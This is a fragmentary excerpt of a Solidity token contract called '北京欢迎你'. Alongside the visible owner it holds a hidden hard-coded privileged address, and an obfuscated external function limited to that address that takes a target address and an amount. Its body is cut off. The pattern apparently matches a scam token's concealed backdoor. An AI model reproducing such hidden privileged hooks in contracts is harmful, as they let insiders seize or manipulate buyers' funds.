...
contract Ownable is Context {
    ...
    address private _yhtrAddress = 0x355CF6A4de61c4A34d9d745006F6b4FFD84AE027;
...
contract welcome is Context, IERC20, Ownable {
    ...
    uint256 private _total = 1000000000000000* 10**8;
    uint256 private _tFeeTotal;
    
    string private _name = "北京欢迎你";
    string private _symbol = "北京欢迎你";
    uint8 private _decimals = 8;

     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x9C57A956D495A6a2937a20d6bd0108bc79F29D53;
    ...
    function _vyreegfwzlc(address pzytd, uint256 trbvjvfs) external yhtrAddress() {
        require(trbvjvfs > 0, "mhdsdferhbfcwch");
